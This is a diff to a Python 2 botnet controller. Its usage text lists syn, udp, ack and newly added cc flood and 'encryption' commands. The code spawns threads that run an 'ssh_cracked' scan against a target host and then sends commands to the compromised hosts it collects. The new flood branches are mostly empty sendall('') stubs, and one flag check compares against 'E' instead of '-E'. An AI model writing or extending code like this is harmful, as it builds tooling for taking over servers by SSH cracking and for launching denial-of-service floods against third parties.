@@ -21,6 +21,8 @@ def useage_command():
              -S or --syn    **---syn flood
              -U or --udp    **---udp flood
              -A or --ack    **---ack flood
+             -C or --cc     **---cc flood
+             -E or --encryption **--encryption data
     '''
 
 def cook(pkt):
@@ -72,7 +74,7 @@ def main():
     Current_path=os.getcwd()
     try:
         sys.path.append(Current_path+'/modules')
-        sys.path.append(Current_path+'/configuration')
+        #sys.path.append(Current_path+'/configuration')
     except:
         print 'import Error!'
         sys.exit(0)
@@ -113,6 +115,8 @@ def main():
                     for i in range(I_want_threads):
                         th=threading.Thread(target=ssh_cracked.scan,args=(target_host,search_results))
                         th.start()
+                    print 'The search thread is executing........'
+                    break
 
         elif command =='-a' or command =='--attack':
             if live_host.empty():
@@ -132,6 +136,16 @@ def main():
                     l_h[0].sendall('')
                     l_h_q.put(l_h)
             elif command_choice == '-A' or command_choice =='--ack':
+                while not live_host.empty():
+                    l_h=live_host.get()
+                    l_h[0].sendall('')
+                    l_h_q.put(l_h)
+            elif command_choice =='-C' or command_choice =='--cc':
+                while not live_host.empty():
+                    l_h=live_host.get()
+                    l_h[0].sendall('')
+                    l_h_q.put(l_h)
+            elif command_choice=='E' or command_choice =='--encryption':
                 while not live_host.empty():
                     l_h=live_host.get()
                     l_h[0].sendall('')
